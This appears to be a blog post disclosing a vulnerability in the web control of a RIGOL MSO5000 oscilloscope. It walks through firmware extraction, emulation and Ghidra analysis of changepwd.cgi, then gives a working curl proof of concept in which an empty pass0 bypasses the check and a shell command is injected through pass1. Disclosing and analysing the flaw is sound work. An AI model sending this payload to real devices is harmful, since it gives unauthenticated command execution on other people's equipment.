---
title: "Unauthenticated RCE on a RIGOL oscilloscope"
date: 2023-02-08T14:59:51+01:00
---
I work in a company that uses custom electronic boards, so there are plenty of instruments floating around that electrical engineers employ to debug faulty connections and solderings.

One kind of tools used are the oscilloscopes, tools that measure signals and plot them in a graphically understandable way. We have a bunch of them, yet only one model in particular caught my attention, because it has a web interface! 

![](/rigol_web_control.png)

I was super curious so I decided to try and (digitally) crack it open. I headed to the [vendor firmware downloads page](https://www.rigolna.com/firmware/), selected the MSO5000 firmware and waited for my browser to complete the download.

The downloaded file ends in .GEL, and I have never seen that extension before. `file` thinks it's a tar archive, so let's try to use `binwalk -e` and extract what's inside.

```plaintext
$ tree --charset=ascii .
.
`-- _DS5000Update.GEL.extracted
    |-- 0.tar
    |-- app.img.gz
    |-- fw4linux.sh
    |-- fw4uboot.sh
    |-- logo.hex.gz
    |-- system.img.gz
    `-- zynq.bit.gz

1 directory, 7 files
```

The `app.img.gz` looked intersting and after extraction, in fact turned out containing the binaries for the web control application. 

After extracting the `app.img.gz` with `p7zip`, I used `binwalk -e` again (it actually asked to install [this tool](https://github.com/jrspruitt/ubi_reader) before allowing me to extract the files) and this was the resulting folder.

```plaintext
$ tree --charset=ascii -L 2 .
.
`-- app
    |-- appEntry
    |-- cups
    |-- default
    |-- drivers
    |-- K160M_TOP.bit
    |-- mail
    |-- Qt5.5
    |-- resource
    |-- shell
    |-- tools
    `-- webcontrol

10 directories, 2 files
```

Hooray! The `webcontrol` folder looks promising. And in fact here there are all the files needed in order to launch the webcontrol application.

## Let's try to emulate it!
We will use `qemu` and `chroot` in combination in order to emulate the oscilloscope software without having to brick a real oscilloscope.

But before tinkering with `qemu`, we need to have an exact copy of the internal memory of the oscilloscope, in order to have all the correct libraries installed.

Extract the `system.img` file we found before with `binwalk -e`. It will contain a file named `rootfs.img`, which is an ext2 image. 

Mount and copy the rootfs image with `mkdir mount && sudo mount rootfs.img mount/ && cp -r mount rootfs && sudo umount mount`. This should be the result.

```plaintext
$ tree -L 1 --charset=ascii
.
|-- bin
|-- checkapp
|-- dev
|-- etc
|-- home
|-- lib
|-- licenses
|-- linuxrc -> bin/busybox
|-- lost+found
|-- media
|-- mnt
|-- opt
|-- proc
|-- rigol
|-- root
|-- sbin
|-- sys
|-- tmp
|-- ubifs-util
|-- user
|-- usr
`-- var

20 directories, 2 files

```

Now, let's try to emulate something with `qemu`, like a shell.

Make sure to install `qemu qemu-user-static binfmt-support`. If you're using Ubuntu: `sudo apt install qemu qemu-user-static binfmt-support`.

Then copy `qemu-arm-static` to a place inside the rootfs, so when we `chroot` into the folder, it will be found.

```bash
sudo cp /usr/bin/qemu-arm-static ./rootfs/bin
```

Then use `sudo chroot . sh` to emulate a shell.
```plaintext
~/rootfs 
$ sudo chroot . sh
/ # ls
bin         home        lost+found  proc        sys         usr
checkapp    lib         media       rigol       tmp         var
dev         licenses    mnt         root        ubifs-util
etc         linuxrc     opt         sbin        user
/ # whoami
root
/ # uname -a
Linux pwnOS 5.15.0-58-generic #64-Ubuntu SMP Thu Jan 5 11:43:13 UTC 2023 armv7l GNU/Linux
/ # 
```

Perfect, we have a functioning rootfs. Let's try to execute some RIGOL software. Copy the `/webcontrol` folder we found in the `app.img` file into `rootfs/rigol`, don't copy it to the rootfs root, otherwise ld.so complains for some reason.

```bash
sudo cp -r ~/Downloads/osc/app/webcontrol ./rootfs/rigol
```

If we looked inside the `app.img` dump, we would have found a file named `app/shell/start.sh` that is responsible to launch the main components of the oscilloscope. In that file, we can see the part that launches the web control application.
```plaintext
############################################
#Start webcontrol service
############################################
DATA_FILE=/rigol/data/user.conf
if [ ! -f $DATA_FILE ]; then
	cp /rigol/default/user.conf /rigol/data/
	sync
fi
/rigol/webcontrol/sbin/lighttpd -f /rigol/webcontrol/config/lighttpd.conf &
```

*By default, the file `/rigol/default/user.conf` contains only 
`admin:rigol` (which are the default credentials of the web application).Let's create a new file `/rigol/webcontrol/config/user.conf` with `admin:rigol`*

Let's try to launch the webcontrol!
```bash
# Let's use -D to avoid letting the server go in the background.
sudo chroot . /rigol/webcontrol/sbin/lighttpd -D -f /rigol/webcontrol/config/lighttpd.conf
```

![The emulated web server, we did it!](/rigol_web_control_emulated.png)

We did it! Since we now have a functioning RIGOL web control application, let's start to look for bugs.

While I could have started anywhere, I was intrigued by the `cgi-bin` folder. I fired up my Ghidra instance and I loaded every `cgi-bin` entry into it.

After a bit of unsuccessful fiddling and checking for buffer uses (I was aiming for a memory corruption vulnerability), I found some strange stuff on `changepwd.cgi`. 

Let's load it on Ghidra.

## The vulnerability
This binary gets executed every time the user wants to change their password.

First of all we need to find the `main` function. Luckily, symbols are left intact in this, so we don't have to guess too much. The main function is a little bit strange: turns out that this binary uses [this library](https://github.com/boutell/cgic) to handle CGI programming in C. 

As the project's `README` [says](https://github.com/boutell/cgic#how-to-write-a-cgic-application), the developer's custom code starts in the function `cgiMain()`. Let's find it.

![The disassembly](/changepwd-bin.png)

The call to `system` looks super suspicious. The author basically wanted a quick way to write `admin:user_password` inside the `path` file (`/rigol/data/user.conf`). It does this by launching a shell and executing `echo admin:user_password > /rigol/data/user.conf`.

```c
n = strlen(pass0);
iVar2 = strncmp(saved_pwd,pass0,n);
if (iVar2 == 0) {
    sprintf(&CMD_BUF,"echo admin:%s > %s",pass1,path);
    system(&CMD_BUF);
    system("sync");
    puts("OK");
}
else {
    puts("Old password is wrong");
}
```

If an attacker passing something like `; whoami # ` as `pass1`, they could execute arbitrary commands on the underlying system.

But, in order to reach that command injection vulnerability we need to pass the `strncmp` check that checks `pass0` against the saved password.

As per the manual, the `int strncmp(const char s1, const char s2, size_t n)` function compares the first `n` characters of the two strings. It is a little less known that if `n` is 0, the result of the `strncmp` function is also 0. 

Can we force `n` to be 0?

Yes, if we manage to control `pass0`. If we passed an empty `pass0`, the `strlen` function would return 0 and that 0 would get passed as the `n` parameter to the `strncmp` function, letting us bypass the check!

So, we need to check whether we actually control `pass0` and `pass1`. If we scroll up a little bit we find these two assignments.

```c
pcVar1 = (char *)read_item_value("pass0",256);
strcpy(pass0,pcVar1);
pcVar1 = (char *)read_item_value("pass1",256);
strcpy(pass1,pcVar1);
```

`read_item_value` is basically a wrapper around [`cgiFormString`](https://github.com/boutell/cgic#cgiFormString). If we provide the `pass0` and `pass1` form values in our HTTP request, we're set.
```c
char* read_item_value(char* param,int size) {
  // cmd_str is a global allocated buffer.
  memset(cmd_str,0,0x100);
  cgiFormString(param,cmd_str,size);
  return cmd_str;
}
```

## The exploit
So, in the end, we control everything! A simple `curl` command is enough to hack an RIGOL oscilloscope through the RIGOL Web Control, without being authenticated at all.

```bash
curl http://localhost/cgi-bin/changepwd.cgi -d "pass0=" -d "pass1=; whoami; id; uname -a # "
```

![pwned](/exploit.png)

## Timeline
* Vulnerability found, 11/8/22
* Sent detailed PoC, 11/9/22
* RIGOL says they would have contacted me with updates from R&D, 11/9/22
* Follow-up on the vulnerability, 1/25/23
* RIGOL says they would reply in 2-3 days, 1/28/23
* Full disclosure, 2/8/23

## Conclusion
Do not expose your RIGOL oscilloscopes to the internet.

## Trivia
I also made [a CTF challenge](https://github.com/havce/havceCTF/tree/master/scope) based on this vulnerability.